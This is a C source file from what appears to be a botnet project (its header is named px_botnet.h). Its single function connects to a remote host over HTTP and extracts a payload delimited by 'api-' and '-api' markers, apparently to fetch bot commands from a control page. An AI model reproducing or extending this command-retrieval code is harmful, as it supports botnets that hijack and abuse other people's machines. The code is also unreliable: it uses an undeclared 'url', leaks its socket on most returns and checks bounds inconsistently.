#include "../../includes/px_botnet.h"

char	*ft_request(char *page)
{
	const char	*ip = host_to_ip(url);
	char		*content;
	char		**a;
	char		**b;
	char		*tmp;
	int			i;

	i = 0;
	content = NULL;
	if (!ip)
		return (NULL);

	SOCKET		sock;
	SOCKADDR_IN	sin;

	if (!http_create_socket(&sock, &sin, ip))
		return (NULL);
	content = http_request(sock, url, page);
	if (content == NULL)
		return (NULL);
	while (content[i])
	{
		if (content[i ] && content[i + 1] && content[i + 2] && content[i + 3] && content[i] == 'a' && content[i + 1] == 'p' && content[i + 2] == 'i' && content[i + 3] == '-')
		{
			tmp = ft_strdup(content + i + 4);
			i = 0;
			free(content);
			while (tmp[i])
			{
				if (tmp[i + 1] && tmp[i + 2] && tmp[i + 3] && tmp[i] == '-' && tmp[i + 1] == 'a' && tmp[i + 2] == 'p' && tmp[i + 3] == 'i')
				{
					tmp[i] = '\0';
					return (tmp);
				}
				i++;
			}
			return (tmp);
		}
		i++;
	}
	closesocket(sock);
	return (NULL);
}